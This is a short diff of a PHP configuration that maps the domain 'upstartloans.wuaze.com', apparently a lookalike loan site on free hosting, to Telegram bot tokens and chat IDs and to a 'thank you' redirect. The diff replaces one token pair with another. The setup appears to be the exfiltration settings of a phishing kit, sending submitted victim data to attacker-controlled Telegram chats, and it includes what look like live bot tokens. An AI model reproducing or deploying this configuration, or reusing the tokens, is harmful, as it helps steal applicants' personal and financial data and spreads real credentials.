@@ -42,7 +42,7 @@ $site_map = [
     'upstartloans.wuaze.com' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '7797738217:AAG_PAbslwMCUjOjknuXbuDKhve87D0E0yM', 'chat_id' => '7336413391']
+            ['token' => '7829342178:AAG7bSD5-XY5pgg3XO0ynfVytz87oIwasZQ', 'chat_id' => '1566821522']
 
         ],
         'redirect' => 'https://upstartloans.wuaze.com/cache_site/thankyou.html'
